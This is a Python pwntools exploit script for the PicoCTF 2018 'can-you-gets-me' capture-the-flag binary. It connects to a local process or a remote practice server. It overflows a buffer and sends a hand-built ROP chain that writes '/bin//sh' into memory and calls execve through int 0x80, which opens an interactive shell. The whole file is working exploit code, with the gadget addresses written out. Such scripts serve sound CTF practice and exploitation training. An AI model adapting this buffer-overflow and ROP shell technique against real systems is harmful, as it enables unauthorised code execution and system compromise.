#! /usr/bin/python

import sys
from pwn import *
from struct import pack
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	sh = process('./PicoCTF_2018_can-you-gets-me')
	elf = ELF('./PicoCTF_2018_can-you-gets-me',checksec=False)

else:
	sh = remote('node3.buuoj.cn',29011)
	elf = ELF('./PicoCTF_2018_can-you-gets-me',checksec=False)

def pwn():

    p = 'A' * 0x18 + 'dead'
    p += pack('<I', 0x0806f02a) # pop edx ; ret
    p += pack('<I', 0x080ea060) # @ .data
    p += pack('<I', 0x080b81c6) # pop eax ; ret
    p += '/bin'
    p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806f02a) # pop edx ; ret
    p += pack('<I', 0x080ea064) # @ .data + 4
    p += pack('<I', 0x080b81c6) # pop eax ; ret
    p += '//sh'
    p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806f02a) # pop edx ; ret
    p += pack('<I', 0x080ea068) # @ .data + 8
    p += pack('<I', 0x08049303) # xor eax, eax ; ret
    p += pack('<I', 0x080549db) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080481c9) # pop ebx ; ret
    p += pack('<I', 0x080ea060) # @ .data
    p += pack('<I', 0x080de955) # pop ecx ; ret
    p += pack('<I', 0x080ea068) # @ .data + 8
    p += pack('<I', 0x0806f02a) # pop edx ; ret
    p += pack('<I', 0x080ea068) # @ .data + 8
    p += pack('<I', 0x08049303) # xor eax, eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0807a86f) # inc eax ; ret
    p += pack('<I', 0x0806cc25) # int 0x80
    
    sh.sendline(p)
    sh.interactive()

pwn()